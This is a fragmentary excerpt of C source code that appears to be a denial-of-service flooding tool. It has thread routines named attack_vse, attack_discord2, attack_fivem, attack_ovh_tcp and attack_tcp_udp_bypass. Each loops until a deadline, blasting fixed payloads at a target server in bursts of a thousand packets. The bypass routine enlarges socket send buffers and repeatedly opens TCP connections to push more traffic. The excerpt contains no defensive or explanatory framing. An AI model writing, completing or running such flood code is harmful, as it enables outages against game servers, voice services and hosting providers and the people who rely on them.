...
void *attack_ovh_tcp(void *arg) {
    ...
    for (int i = 0; i < packet_count; i++) free(packets[i]);
    free(packets);
    free(params);
...
void *attack_vse(void *arg) {
    ...
    while (time(NULL) < params->end_time && !(*(params->stop_flag))) {
        for (int i = 0; i < 1000; i++) {
            sendto(sock, payload_vse, payload_size, 0,
                   (struct sockaddr *)&server, sizeof(server));
            total_sent++;
        }
    }
...
void *attack_discord2(void *arg) {
    ...
    while (time(NULL) < params->end_time && !(*(params->stop_flag))) {
        for (int i = 0; i < 1000; i++) {
            sendto(sock, payload_discord2, payload_size, 0,
                   (struct sockaddr *)&server, sizeof(server));
            total_sent++;
        }
    }
...
void *attack_fivem(void *arg) {
    ...
    while (time(NULL) < params->end_time && !(*(params->stop_flag))) {
        for (int i = 0; i < 1000; i++) {
            sendto(sock, payload_fivem, payload_size, 0,
                   (struct sockaddr *)&server, sizeof(server));
            total_sent++;
        }
    }
...
void *attack_tcp_udp_bypass(void *arg) {
    ...
    if (sock_udp != INVALID_SOCKET) {
        int sndbuf = 8 * 1024 * 1024;
        setsockopt(sock_udp, SOL_SOCKET, SO_SNDBUF, (const char*)&sndbuf, sizeof(sndbuf));
        u_long mode = 1;
        ioctlsocket(sock_udp, FIONBIO, &mode);
    }
    ...
    while (time(NULL) < params->end_time && !(*(params->stop_flag))) {
        ...
        if (use_tcp) {
            ...
            if (sock_tcp != INVALID_SOCKET) {
                ...
                int sndbuf = 4 * 1024 * 1024;
                setsockopt(sock_tcp, SOL_SOCKET, SO_SNDBUF, (const char*)&sndbuf, sizeof(sndbuf));
                connect(sock_tcp, (struct sockaddr *)&server, sizeof(server));
                for (int i = 0; i < 20; i++) {
                    send(sock_tcp, packet, size, 0);
                    total_sent++;
                }
    ...
    if (sock_udp != INVALID_SOCKET) closesocket(sock_udp);
    free(params);
